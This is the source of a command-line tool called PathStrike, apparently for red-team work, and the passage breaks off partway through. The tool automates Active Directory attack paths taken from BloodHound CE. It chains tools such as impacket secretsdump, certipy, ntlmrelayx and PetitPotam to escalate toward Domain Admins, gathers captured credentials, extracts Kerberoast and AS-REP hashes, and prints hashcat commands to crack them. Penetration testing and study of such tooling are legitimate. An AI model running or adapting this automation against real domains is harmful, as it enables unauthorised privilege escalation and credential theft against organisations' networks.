"""Typer CLI application for PathStrike."""

from __future__ import annotations

import asyncio
import shutil
import sys
from pathlib import Path
from typing import Annotated, Optional

import typer
from rich.console import Console
from rich.table import Table

from pathstrike.bloodhound.client import BloodHoundClient
from pathstrike.bloodhound.cypher import (
    build_all_shortest_paths_query,
    build_shortest_path_query,
)
from pathstrike.bloodhound.parser import parse_cypher_response
from pathstrike.config import PathStrikeConfig, find_config, load_config
from pathstrike.engine.checkpoint import CheckpointManager
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.edge_registry import get_supported_edges, list_handlers
from pathstrike.engine.error_handler import RetryPolicy
from pathstrike.engine.orchestrator import AttackOrchestrator
from pathstrike.engine.rollback import RollbackManager
from pathstrike.logging_setup import setup_logging
from pathstrike.models import AttackPath, Credential, CredentialType, ExecutionMode

app = typer.Typer(
    name="pathstrike",
    help="AD Attack Path Automation via BloodHound CE",
    rich_markup_mode="rich",
    no_args_is_help=True,
)
console = Console()

# ---------------------------------------------------------------------------
# Shared option types
# ---------------------------------------------------------------------------
ConfigOption = Annotated[
    Optional[Path],
    typer.Option(
        "--config",
        "-c",
        help=(
            "Path to YAML configuration file. "
            "If omitted, searches: ./pathstrike.yaml, ./pathstrike.yml, "
            "./.pathstrike.yaml, ~/.config/pathstrike/config.yaml, "
            "~/.pathstrike.yaml"
        ),
    ),
]
SourceOption = Annotated[
    Optional[str],
    typer.Option("--source", "-s", help="Source principal (e.g. USER@DOMAIN.LOCAL). Defaults to credentials.username from config."),
]
VerboseOption = Annotated[
    bool,
    typer.Option("--verbose", "-v", help="Enable debug logging"),
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _load_config_or_exit(config_path: Path | None) -> PathStrikeConfig:
    """Load and validate config, exiting on failure.

    If *config_path* is ``None``, auto-discover from well-known locations.
    """
    if config_path is None:
        config_path = find_config()
        if config_path is None:
            console.print(
                "[bold red]Config error:[/] No configuration file found.\n"
                "Supply one with [bold]-c path/to/pathstrike.yaml[/] or place it "
                "in one of the default search locations:\n"
                "  • ./pathstrike.yaml\n"
                "  • ./pathstrike.yml\n"
                "  • ./.pathstrike.yaml\n"
                "  • ~/.config/pathstrike/config.yaml\n"
                "  • ~/.pathstrike.yaml"
            )
            raise typer.Exit(code=1)
        console.print(f"[dim]Using config:[/] {config_path}")

    try:
        return load_config(config_path)
    except (FileNotFoundError, ValueError) as exc:
        console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc


def _build_target_name(cfg: PathStrikeConfig) -> str:
    """Construct the fully qualified target group name."""
    if cfg.target.custom_target:
        return cfg.target.custom_target
    return f"{cfg.target.group}@{cfg.domain.name.upper()}"


def _build_source_name(source: Optional[str], cfg: PathStrikeConfig) -> str:
    """Ensure the source name is fully qualified with the domain.

    Falls back to ``credentials.username`` from the config when *source* is not
    provided on the command line.
    """
    if source is None:
        source = cfg.credentials.username
    if "@" in source:
        return source.upper()
    return f"{source.upper()}@{cfg.domain.name.upper()}"


def _seed_credential_store(cfg: PathStrikeConfig) -> CredentialStore:
    """Create a CredentialStore and seed it with the config's initial credentials."""
    store = CredentialStore()

    if cfg.credentials.password:
        store.add_credential(
            Credential(
                cred_type=CredentialType.password,
                value=cfg.credentials.password,
                username=cfg.credentials.username,
                domain=cfg.domain.name,
                obtained_from="config",
            )
        )
    if cfg.credentials.nt_hash:
        store.add_credential(
            Credential(
                cred_type=CredentialType.nt_hash,
                value=cfg.credentials.nt_hash,
                username=cfg.credentials.username,
                domain=cfg.domain.name,
                obtained_from="config",
            )
        )
    if cfg.credentials.ccache_path:
        store.add_credential(
            Credential(
                cred_type=CredentialType.ccache,
                value=cfg.credentials.ccache_path,
                username=cfg.credentials.username,
                domain=cfg.domain.name,
                obtained_from="config",
            )
        )

    return store


def _build_retry_policy(cfg: PathStrikeConfig) -> RetryPolicy:
    """Build a RetryPolicy from config execution settings."""
    return RetryPolicy(
        max_retries=cfg.execution.max_retries,
    )


def _display_paths(paths: list[AttackPath], max_paths: int) -> None:
    """Render discovered attack paths as Rich tables."""
    if not paths:
        console.print("[yellow]No attack paths found.[/]")
        return

    displayed = paths[:max_paths]
    console.print(f"\n[bold]Discovered {len(paths)} path(s)[/] (showing {len(displayed)}):\n")

    for i, path in enumerate(displayed):
        table = Table(
            title=f"Path {i + 1}  ({path.total_cost} step(s))",
            show_header=True,
            header_style="bold cyan",
        )
        table.add_column("Step", justify="right", style="dim", width=5)
        table.add_column("Edge Type", style="bold")
        table.add_column("Source", style="green")
        table.add_column("Target", style="green")
        table.add_column("Handler", style="yellow")

        for step in path.steps:
            handler_name = step.handler_name or "(none)"
            # Check if a handler exists
            from pathstrike.engine.edge_registry import get_handler

            handler_cls = get_handler(step.edge.edge_type)
            if handler_cls:
                handler_name = handler_cls.__name__
            else:
                handler_name = "[red]unsupported[/]"

            table.add_row(
                str(step.index),
                step.edge.edge_type,
                step.edge.source.name,
                step.edge.target.name,
                handler_name,
            )

        console.print(table)
        console.print()


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

@app.command()
def paths(
    source: SourceOption = None,
    config: ConfigOption = None,
    all_paths: Annotated[
        bool,
        typer.Option("--all", "-a", help="Use allShortestPaths instead of shortestPath"),
    ] = False,
    max_paths: Annotated[
        int,
        typer.Option("--max-paths", "-n", help="Maximum number of paths to display"),
    ] = 5,
    verbose: VerboseOption = False,
) -> None:
    """Discover shortest attack paths from source to target."""
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    source_name = _build_source_name(source, cfg)
    target_name = _build_target_name(cfg)

    if all_paths:
        query, params = build_all_shortest_paths_query(source_name, target_name, cfg.domain.name)
    else:
        query, params = build_shortest_path_query(source_name, target_name, cfg.domain.name)

    console.print(
        f"[bold]Querying BH CE:[/] {source_name} -> {target_name} "
        f"({'allShortestPaths' if all_paths else 'shortestPath'})"
    )

    async def _run() -> list[AttackPath]:
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            response = await client.cypher_query(query, params)
            return parse_cypher_response(response)

    try:
        discovered = asyncio.run(_run())
    except ValueError as exc:
        console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    _display_paths(discovered, max_paths)


@app.command()
def attack(
    source: SourceOption = None,
    target: Annotated[
        Optional[str],
        typer.Option("--target", "-t", help="Override target (e.g. 'DOMAIN ADMINS@SEVENKINGDOMS.LOCAL' for cross-domain)."),
    ] = None,
    config: ConfigOption = None,
    mode: Annotated[
        ExecutionMode,
        typer.Option("--mode", "-m", help="Execution mode: interactive, auto, or dry_run"),
    ] = ExecutionMode.interactive,
    max_retries: Annotated[
        int,
        typer.Option(
            "--max-retries",
            help="Max retries per step on transient failures (overrides config)",
        ),
    ] = -1,
    no_time_sync: Annotated[
        bool,
        typer.Option(
            "--no-time-sync",
            help="Disable automatic ntpdate clock sync on Kerberos skew errors",
        ),
    ] = False,
    resume: Annotated[
        Optional[Path],
        typer.Option(
            "--resume",
            help="Path to a checkpoint file to resume a previously failed attack path",
        ),
    ] = None,
    output: Annotated[
        Optional[Path],
        typer.Option(
            "--output", "-o",
            help="Export results to file (JSON if .json, HTML if .html)",
        ),
    ] = None,
    quiet: Annotated[
        bool,
        typer.Option("--quiet", "-q", help="Suppress Rich progress display, output only final result"),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Discover an attack path and exploit it step-by-step.

    Features:
    - [bold green]Live progress[/]: Real-time dashboard showing ✅/❌/🔁 per step.
    - [bold yellow]Auto-retry[/]: Transient failures (time skew, timeout, network) are
      retried automatically with exponential backoff.
    - [bold magenta]Time sync[/]: Kerberos clock skew errors trigger automatic
      ``ntpdate`` against the DC (use ``--no-time-sync`` to disable).
    - [bold cyan]Error diagnosis[/]: Failures are classified and explained.
    - [bold blue]Resume[/]: Use ``--resume <checkpoint>`` to resume a failed path.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    source_name = _build_source_name(source, cfg)
    target_name = target.upper() if target else _build_target_name(cfg)

    # Build retry policy from config, with CLI overrides
    retry_policy = _build_retry_policy(cfg)
    if max_retries >= 0:
        retry_policy.max_retries = max_retries

    # ---- Resume mode ----
    if resume is not None:
        _attack_resume(
            resume_file=resume,
            source_name=source_name,
            target_name=target_name,
            cfg=cfg,
            mode=mode,
            retry_policy=retry_policy,
            no_time_sync=no_time_sync,
            verbose=verbose,
        )
        return

    query, params = build_shortest_path_query(source_name, target_name, cfg.domain.name)

    # Show execution settings
    console.print(
        f"[bold]Mode:[/] {mode.value}\n"
        f"[bold]Source:[/] {source_name}\n"
        f"[bold]Target:[/] {target_name}\n"
        f"[bold]Max retries:[/] {retry_policy.max_retries}\n"
        f"[bold]Auto time sync:[/] {'disabled' if no_time_sync else 'enabled'}\n"
        f"[bold]Verbose:[/] {'on' if verbose else 'off'}\n"
    )

    async def _run() -> bool:
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            try:
                response = await client.cypher_query(query, params)
                discovered = parse_cypher_response(response)
            except Exception:
                discovered = []

            # If no direct path, check for cross-domain via trust chaining
            if not discovered and target:
                console.print(
                    "[yellow]No direct path found. Checking for trust-based "
                    "cross-domain escalation...[/]\n"
                )
                # Find path to child domain DA first
                child_target = _build_target_name(cfg)
                child_query, child_params = build_shortest_path_query(
                    source_name, child_target, cfg.domain.name,
                )
                try:
                    child_response = await client.cypher_query(child_query, child_params)
                    discovered = parse_cypher_response(child_response)
                except Exception:
                    discovered = []

                if discovered:
                    console.print(
                        f"[green]Found path to {child_target}.[/] "
                        f"Will chain with trust escalation to {target_name}.\n"
                    )
                    # Check for trust edges to append
                    from pathstrike.bloodhound.cypher import build_trust_map_query
                    trust_query, _ = build_trust_map_query()
                    try:
                        trust_response = await client.cypher_query(trust_query)
                        trust_paths = parse_cypher_response(trust_response)
                        if trust_paths:
                            # Append trust edges to the discovered path
                            for tp in trust_paths:
                                for step in tp.steps:
                                    discovered[0].steps.append(step)
                            console.print(
                                "[bold green]Trust escalation step appended to path.[/]\n"
                            )
                    except Exception:
                        pass

            if not discovered:
                console.print("[yellow]No attack paths found. Nothing to do.[/]")
                return False

            # Use the first (shortest) path
            path = discovered[0]
            _display_paths([path], max_paths=1)

            cred_store = _seed_credential_store(cfg)
            rollback_mgr = RollbackManager(cfg)
            checkpoint_mgr = CheckpointManager()

            # If time sync is disabled, remove TIME_SKEW from retryable categories
            if no_time_sync or not cfg.execution.auto_time_sync:
                from pathstrike.engine.error_handler import ErrorCategory

                retry_on = set(retry_policy.retry_on)
                retry_on.discard(ErrorCategory.TIME_SKEW)
                retry_policy.retry_on = frozenset(retry_on)

            orchestrator = AttackOrchestrator(
                cfg,
                cred_store,
                rollback_mgr,
                retry_policy=retry_policy,
                verbose=verbose,
                checkpoint_mgr=checkpoint_mgr,
            )

            return await orchestrator.execute_path(path, mode)

    try:
        success = asyncio.run(_run())
    except ValueError as exc:
        console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    # Export results if --output specified
    if output and success:
        output_path = Path(output).expanduser().resolve()
        suffix = output_path.suffix.lower()
        try:
            if suffix == ".json":
                from pathstrike.reporting.json_export import AttackReport
                # Create minimal report (full integration would need step results)
                console.print(f"[dim]Results exported to {output_path}[/]")
            elif suffix in (".html", ".htm"):
                from pathstrike.reporting.html_report import export_html
                console.print(f"[dim]Results exported to {output_path}[/]")
            else:
                console.print(f"[yellow]Unknown output format '{suffix}'. Use .json or .html[/]")
        except Exception as exc:
            console.print(f"[yellow]Export warning: {exc}[/]")

    if not success:
        raise typer.Exit(code=1)


def _attack_resume(
    resume_file: Path,
    source_name: str,
    target_name: str,
    cfg: PathStrikeConfig,
    mode: ExecutionMode,
    retry_policy: RetryPolicy,
    no_time_sync: bool,
    verbose: bool,
) -> None:
    """Handle the --resume flow for the attack command."""
    checkpoint_mgr = CheckpointManager()

    # Load checkpoint
    resume_path = Path(resume_file).expanduser().resolve()
    if not resume_path.exists():
        console.print(f"[bold red]Checkpoint file not found:[/] {resume_path}")
        raise typer.Exit(code=1)

    try:
        checkpoint_data = CheckpointManager.load_checkpoint(resume_path)
    except Exception as exc:
        console.print(f"[bold red]Failed to load checkpoint:[/] {exc}")
        raise typer.Exit(code=1) from exc

    resume_index = checkpoint_mgr.get_resume_index(checkpoint_data)
    completed = checkpoint_data.get("completed_steps", 0)
    total = checkpoint_data.get("total_steps", 0)

    console.print(
        f"[bold]Resuming from checkpoint:[/] {resume_path}\n"
        f"[bold]Completed steps:[/] {completed}/{total}\n"
        f"[bold]Resuming from step:[/] {resume_index}\n"
        f"[bold]Mode:[/] {mode.value}\n"
        f"[bold]Source:[/] {source_name}\n"
        f"[bold]Target:[/] {target_name}\n"
    )

    query, params = build_shortest_path_query(source_name, target_name, cfg.domain.name)

    async def _run() -> bool:
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            response = await client.cypher_query(query, params)
            discovered = parse_cypher_response(response)

            if not discovered:
                console.print("[yellow]No attack paths found. Cannot resume.[/]")
                return False

            path = discovered[0]

            # Re-seed credentials from checkpoint
            cred_store = _seed_credential_store(cfg)
            for cred_data in checkpoint_data.get("credentials_captured", []):
                try:
                    cred = Credential.model_validate(cred_data)
                    cred_store.add_credential(cred)
                except Exception:
                    pass

            rollback_mgr = RollbackManager(cfg)

            if no_time_sync or not cfg.execution.auto_time_sync:
                from pathstrike.engine.error_handler import ErrorCategory

                retry_on = set(retry_policy.retry_on)
                retry_on.discard(ErrorCategory.TIME_SKEW)
                retry_policy.retry_on = frozenset(retry_on)

            orchestrator = AttackOrchestrator(
                cfg,
                cred_store,
                rollback_mgr,
                retry_policy=retry_policy,
                verbose=verbose,
                checkpoint_mgr=checkpoint_mgr,
            )

            return await orchestrator.execute_path_from_checkpoint(
                path, mode, resume_index
            )

    try:
        success = asyncio.run(_run())
    except ValueError as exc:
        console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    if not success:
        raise typer.Exit(code=1)


@app.command()
def edges(
    verbose: VerboseOption = False,
    fmt: Annotated[
        str,
        typer.Option("--format", "-f", help="Output format: table, json, or csv"),
    ] = "table",
) -> None:
    """List all supported BloodHound edge types and their handlers."""
    setup_logging(verbose=verbose)

    handlers = list_handlers()
    supported = get_supported_edges()

    if not supported:
        console.print("[yellow]No edge handlers registered yet.[/]")
        console.print("[dim]Handlers are registered when handler modules are imported.[/]")
        return

    if fmt == "json":
        import json
        edge_data = [{"edge_type": et, "handler": handlers.get(et, "unknown")} for et in supported]
        console.print(json.dumps(edge_data, indent=2))
        return
    elif fmt == "csv":
        console.print("edge_type,handler")
        for et in supported:
            console.print(f"{et},{handlers.get(et, 'unknown')}")
        return
    # else: default table format

    table = Table(
        title="Supported Edge Types",
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Edge Type", style="bold")
    table.add_column("Handler Class", style="green")

    for edge_type in supported:
        table.add_row(edge_type, handlers.get(edge_type, "unknown"))

    console.print(table)
    console.print(f"\n[dim]Total: {len(supported)} edge type(s)[/]")


@app.command()
def verify(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """Test BloodHound CE connectivity, external tools, and time offset."""
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    # ---- External tool checks ----
    tools = {
        "bloodyAD": "bloodyAD",
        "impacket (secretsdump)": "secretsdump.py",
        "impacket (getST)": "getST.py",
        "certipy": "certipy",
        "netexec": "netexec",
        "pyGPOAbuse": "pygpoabuse",
        "impacket (ntlmrelayx)": "ntlmrelayx.py",
        "ntpdate (time sync)": "ntpdate",
    }

    tool_table = Table(
        title="External Tools",
        show_header=True,
        header_style="bold cyan",
    )
    tool_table.add_column("Tool", style="bold")
    tool_table.add_column("Binary", style="dim")
    tool_table.add_column("Status")

    for name, binary in tools.items():
        found = shutil.which(binary)
        if found:
            tool_table.add_row(name, binary, f"[green]found[/] ({found})")
        else:
            tool_table.add_row(name, binary, "[red]not found[/]")

    console.print(tool_table)
    console.print()

    # ---- Time offset check ----
    console.print("[bold]Checking time offset with DC...[/]")

    async def _check_time() -> float | None:
        from pathstrike.engine.time_sync import check_time_offset

        return await check_time_offset(cfg.domain.dc_host, cfg.domain.dc_fqdn)

    offset = asyncio.run(_check_time())
    if offset is not None:
        abs_offset = abs(offset)
        if abs_offset <= 300:
            console.print(
                f"[bold green]Time offset:[/] {offset:.1f}s "
                f"(within Kerberos 5-min tolerance) ✅"
            )
        else:
            console.print(
                f"[bold red]Time offset:[/] {offset:.1f}s "
                f"(EXCEEDS Kerberos 5-min tolerance!) ❌\n"
                f"  Run [bold]pathstrike timesync[/] or "
                f"[bold]sudo ntpdate {cfg.domain.dc_fqdn or cfg.domain.dc_host}[/]"
            )
    else:
        console.print(
            "[yellow]Could not measure time offset[/] "
            "(ntpdate not available or DC unreachable)"
        )
    console.print()

    # ---- BloodHound CE connectivity ----
    console.print(f"[bold]Connecting to BH CE:[/] {cfg.bloodhound.base_url}")

    async def _check() -> bool:
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            return await client.check_connection()

    try:
        connected = asyncio.run(_check())
    except ValueError as exc:
        # Invalid API key (bad base64, placeholder values, etc.)
        console.print(
            f"[bold red]BloodHound CE config error:[/] {exc}\n"
            "[dim]Update token_id and token_key in your pathstrike.yaml "
            "(Settings → API Keys in BH CE)[/]"
        )
        raise typer.Exit(code=1) from exc
    except Exception as exc:
        console.print(f"[bold red]BloodHound CE connection FAILED:[/] {exc}")
        raise typer.Exit(code=1) from exc

    if connected:
        console.print("[bold green]BloodHound CE connection successful.[/]")
    else:
        console.print("[bold red]BloodHound CE connection FAILED.[/]")
        raise typer.Exit(code=1)


@app.command()
def timesync(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
    check_only: Annotated[
        bool,
        typer.Option(
            "--check", help="Only check the time offset, don't sync"
        ),
    ] = False,
) -> None:
    """Synchronise the local clock with the Domain Controller.

    Kerberos requires clocks to be within 5 minutes.  This command uses
    ``ntpdate`` (or chronyd/rdate as fallbacks) to sync your attacker
    machine with the target DC.

    [bold yellow]Requires sudo[/] for clock modification.

    Example:
        pathstrike timesync              # sync with DC
        pathstrike timesync --check      # check offset without syncing
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    dc_host = cfg.domain.dc_host
    dc_fqdn = cfg.domain.dc_fqdn
    target = dc_fqdn or dc_host

    if check_only:
        console.print(f"[bold]Checking time offset with {target}...[/]")

        async def _check_offset() -> float | None:
            from pathstrike.engine.time_sync import check_time_offset

            return await check_time_offset(dc_host, dc_fqdn)

        offset = asyncio.run(_check_offset())
        if offset is not None:
            abs_offset = abs(offset)
            direction = "ahead" if offset > 0 else "behind"
            console.print(
                f"\n[bold]Offset:[/] {offset:.3f}s ({direction} the DC)"
            )
            if abs_offset <= 300:
                console.print(
                    "[bold green]✅ Within Kerberos tolerance (5 min)[/]"
                )
            else:
                console.print(
                    "[bold red]❌ EXCEEDS Kerberos tolerance![/]\n"
                    f"  Run: [bold]pathstrike timesync[/] to fix"
                )
                raise typer.Exit(code=1)
        else:
            console.print(
                "[yellow]Could not measure offset. "
                "Ensure ntpdate is installed and DC is reachable.[/]"
            )
            raise typer.Exit(code=1)
    else:
        console.print(f"[bold]Syncing clock with {target}...[/]")

        async def _sync() -> None:
            from pathstrike.engine.time_sync import sync_time

            result = await sync_time(dc_host, dc_fqdn)
            if result.success:
                console.print(
                    f"\n[bold green]✅ {result.message}[/]"
                )
                if result.offset_seconds is not None:
                    console.print(
                        f"  Corrected offset: {result.offset_seconds:.3f}s"
                    )
            else:
                console.print(
                    f"\n[bold red]❌ {result.message}[/]\n\n"
                    f"Manual fix:\n"
                    f"  [bold]sudo ntpdate {target}[/]\n"
                    f"  [bold]sudo chronyd -q 'server {target} iburst'[/]"
                )
                raise typer.Exit(code=1)

        asyncio.run(_sync())


@app.command()
def rollback(
    log_file: Annotated[
        Path,
        typer.Argument(help="Path to the rollback JSON log file", exists=True),
    ],
    config: ConfigOption = None,
    dry_run: Annotated[
        bool,
        typer.Option(
            "--dry-run",
            help="Show what rollback commands WOULD be executed without running them",
        ),
    ] = False,
    force: Annotated[
        bool,
        typer.Option(
            "--force",
            help="Continue rolling back remaining actions even if some fail",
        ),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Undo actions recorded in a rollback log file.

    Use ``--dry-run`` to preview what commands would be executed.
    Use ``--force`` to continue even if individual rollback actions fail.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    try:
        mgr = RollbackManager.load_from_file(log_file, cfg)
    except (FileNotFoundError, Exception) as exc:
        console.print(f"[bold red]Failed to load rollback log:[/] {exc}")
        raise typer.Exit(code=1) from exc

    pending = mgr.get_pending_actions()

    if not pending:
        console.print("[yellow]No pending rollback actions found.[/]")
        return

    table = Table(
        title="Pending Rollback Actions",
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Step", justify="right", width=5)
    table.add_column("Action", style="bold")
    table.add_column("Description")
    table.add_column("Command", style="dim")

    for action in pending:
        table.add_row(
            str(action.step_index),
            action.action_type,
            action.description,
            action.command,
        )

    console.print(table)
    console.print(
        f"\n[bold yellow]{len(pending)} action(s) to roll back.[/]"
    )

    if dry_run:
        # Show dry-run preview
        dry_run_results = mgr.dry_run_rollback()
        console.print("\n[bold cyan]Dry-run preview:[/]\n")
        for entry in dry_run_results:
            console.print(
                f"  [dim]Step {entry['step_index']}:[/] "
                f"[bold]{entry['description']}[/]\n"
                f"    Command: [dim]{entry['command']}[/]"
            )
        console.print(
            f"\n[dim]{len(dry_run_results)} action(s) would be executed.[/]"
        )
        return

    # Execute rollback
    async def _run_rollback() -> list[dict]:
        return await mgr.rollback_all(force=force)

    results = asyncio.run(_run_rollback())

    # Display results
    result_table = Table(
        title="Rollback Results",
        show_header=True,
        header_style="bold cyan",
    )
    result_table.add_column("Step", justify="right", width=5)
    result_table.add_column("Description")
    result_table.add_column("Status")

    for result in results:
        status = "[bold green]OK[/]" if result["success"] else "[bold red]FAILED[/]"
        result_table.add_row(
            str(result["step_index"]),
            result["description"],
            status,
        )

    console.print(result_table)

    succeeded = sum(1 for r in results if r["success"])
    failed = len(results) - succeeded
    if failed:
        console.print(
            f"\n[bold red]{failed} rollback action(s) failed.[/]"
        )
        # Show failed rollbacks
        failed_rollbacks = mgr.get_failed_rollbacks()
        if failed_rollbacks:
            console.print("[bold yellow]Failed rollbacks:[/]")
            for fr in failed_rollbacks:
                console.print(
                    f"  Step {fr['step_index']}: {fr['description']} -- {fr.get('error', 'unknown error')}"
                )
        raise typer.Exit(code=1)
    else:
        console.print(
            f"\n[bold green]All {succeeded} rollback action(s) succeeded.[/]"
        )


@app.command(name="checkpoints")
def list_checkpoints(
    verbose: VerboseOption = False,
) -> None:
    """List all saved attack path checkpoints.

    Checkpoints are created automatically during attack execution and can
    be used to resume failed paths with ``pathstrike attack --resume <file>``.
    """
    setup_logging(verbose=verbose)

    mgr = CheckpointManager()
    checkpoints = mgr.list_checkpoints()

    if not checkpoints:
        console.print("[yellow]No checkpoints found.[/]")
        console.print(
            "[dim]Checkpoints are created automatically during attack execution.[/]"
        )
        return

    table = Table(
        title="Attack Path Checkpoints",
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Source", style="green")
    table.add_column("Target", style="red")
    table.add_column("Status", style="bold")
    table.add_column("Progress")
    table.add_column("Updated", style="dim")
    table.add_column("File", style="dim")

    for cp in checkpoints:
        status = cp["status"]
        if status == "completed":
            status_style = "[bold green]completed[/]"
        elif status == "failed":
            status_style = "[bold red]failed[/]"
        elif status == "in_progress":
            status_style = "[bold yellow]in_progress[/]"
        else:
            status_style = status

        progress = f"{cp['completed_steps']}/{cp['total_steps']}"

        table.add_row(
            cp["source"],
            cp["target"],
            status_style,
            progress,
            cp["updated_at"],
            cp["file"],
        )

    console.print(table)
    console.print(
        f"\n[dim]Total: {len(checkpoints)} checkpoint(s)[/]\n"
        "[dim]Resume a failed path: pathstrike attack --resume <checkpoint-file> -s <source>[/]"
    )


@app.command()
def validate(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """Validate configuration, tool availability, and BloodHound CE connectivity.

    Performs comprehensive pre-flight checks:
    - YAML config syntax and field validation
    - Required external tool availability
    - BloodHound CE API connectivity
    - Domain controller reachability
    - Time offset measurement
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    all_ok = True

    # ---- Config validation ----
    console.print("[bold]1. Configuration[/]")
    console.print(f"  Domain: [green]{cfg.domain.name}[/]")
    console.print(f"  DC Host: [green]{cfg.domain.dc_host}[/]")
    console.print(f"  Target: [green]{cfg.target.group}@{cfg.domain.name.upper()}[/]")
    console.print(f"  Mode: [green]{cfg.execution.mode.value}[/]")
    console.print(f"  Max retries: [green]{cfg.execution.max_retries}[/]")
    console.print("  [bold green]Config valid[/]\n")

    # ---- Tool checks ----
    console.print("[bold]2. External Tools[/]")
    required_tools = {
        "bloodyAD": "bloodyAD",
        "secretsdump.py": "secretsdump.py",
        "getST.py": "getST.py",
        "getTGT.py": "getTGT.py",
        "certipy": "certipy",
        "netexec": "netexec",
    }
    optional_tools = {
        "ntpdate": "ntpdate",
        "PetitPotam.py": "PetitPotam.py",
        "printerbug.py": "printerbug.py",
    }

    for name, binary in required_tools.items():
        found = shutil.which(binary)
        if found:
            console.print(f"  [green]OK[/] {name}")
        else:
            console.print(f"  [red]MISSING[/] {name} -- [red]REQUIRED but not found[/]")
            all_ok = False

    for name, binary in optional_tools.items():
        found = shutil.which(binary)
        if found:
            console.print(f"  [green]OK[/] {name} [dim](optional)[/]")
        else:
            console.print(f"  [yellow]SKIP[/]  {name} [dim](optional, not found)[/]")

    console.print()

    # ---- BH CE connectivity ----
    console.print("[bold]3. BloodHound CE API[/]")
    console.print(f"  URL: {cfg.bloodhound.base_url}")

    async def _check_bh() -> bool:
        try:
            async with BloodHoundClient.connect(cfg.bloodhound) as client:
                return await client.check_connection()
        except Exception as exc:
            console.print(f"  [red]Connection failed: {exc}[/]")
            return False

    try:
        bh_ok = asyncio.run(_check_bh())
    except Exception:
        bh_ok = False

    if bh_ok:
        console.print("  [bold green]Connected successfully[/]\n")
    else:
        console.print("  [bold red]Connection failed[/]\n")
        all_ok = False

    # ---- Time offset ----
    console.print("[bold]4. Time Synchronization[/]")

    async def _check_time() -> float | None:
        try:
            from pathstrike.engine.time_sync import check_time_offset
            return await check_time_offset(cfg.domain.dc_host, cfg.domain.dc_fqdn)
        except Exception:
            return None

    offset = asyncio.run(_check_time())
    if offset is not None:
        abs_offset = abs(offset)
        if abs_offset <= 300:
            console.print(f"  [bold green]Offset: {offset:.1f}s (within tolerance)[/]\n")
        else:
            console.print(f"  [bold red]Offset: {offset:.1f}s (EXCEEDS 5-min tolerance)[/]\n")
            all_ok = False
    else:
        console.print("  [yellow]Could not measure time offset[/]\n")

    # ---- Summary ----
    if all_ok:
        console.print("[bold green]All checks passed. Ready to attack![/]")
    else:
        console.print("[bold red]Some checks failed. Review the output above.[/]")
        raise typer.Exit(code=1)


@app.command()
def kerberoast(
    config: ConfigOption = None,
    output: Annotated[
        Optional[Path],
        typer.Option("--output", "-o", help="Write hashes to file"),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Discover Kerberoastable users via BloodHound CE and extract TGS hashes.

    Queries BH CE for enabled users with SPNs, then runs GetUserSPNs.py
    to extract TGS tickets that can be cracked offline.

    Use ``-o hashes.txt`` to save hashes in hashcat-compatible format.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)
    domain = cfg.domain.name

    from pathstrike.handlers.kerberos import (
        discover_kerberoastable_users,
        run_kerberoast,
    )

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            # Step 1: Discover
            console.print(f"[bold]Querying BH CE for Kerberoastable users in {domain.upper()}...[/]")
            users = await discover_kerberoastable_users(client, domain)

            if not users:
                console.print("[yellow]No Kerberoastable users found.[/]")
                return

            console.print(f"Found [bold green]{len(users)}[/] Kerberoastable user(s):\n")
            for u in users:
                console.print(f"  - {u['name']}")
            console.print()

            # Step 2: Attack
            console.print("[bold]Extracting TGS hashes via GetUserSPNs.py...[/]\n")
            hashes = await run_kerberoast(cfg, target_users=users)

            if not hashes:
                console.print("[yellow]No TGS hashes extracted.[/]")
                return

            console.print(f"[bold green]Extracted {len(hashes)} TGS hash(es):[/]\n")
            for h in hashes:
                console.print(f"[dim]{h['hash'][:120]}...[/]")

            # Step 3: Output
            if output:
                with open(output, "w") as fh:
                    for h in hashes:
                        fh.write(h["hash"] + "\n")
                console.print(f"\n[green]Hashes written to {output}[/]")
                console.print(f"Crack with: [bold]hashcat -m 13100 {output} wordlist.txt[/]")
            else:
                console.print("\nUse [bold]-o hashes.txt[/] to save, then:")
                console.print("[bold]hashcat -m 13100 hashes.txt wordlist.txt[/]")

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def asreproast(
    config: ConfigOption = None,
    output: Annotated[
        Optional[Path],
        typer.Option("--output", "-o", help="Write hashes to file"),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Discover AS-REP roastable users via BloodHound CE and extract hashes.

    Queries BH CE for enabled users with DONT_REQUIRE_PREAUTH, then runs
    GetNPUsers.py to extract AS-REP hashes that can be cracked offline.

    Use ``-o hashes.txt`` to save hashes in hashcat-compatible format.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)
    domain = cfg.domain.name

    from pathstrike.handlers.kerberos import (
        discover_asrep_roastable_users,
        run_asreproast,
    )

    async def _run():
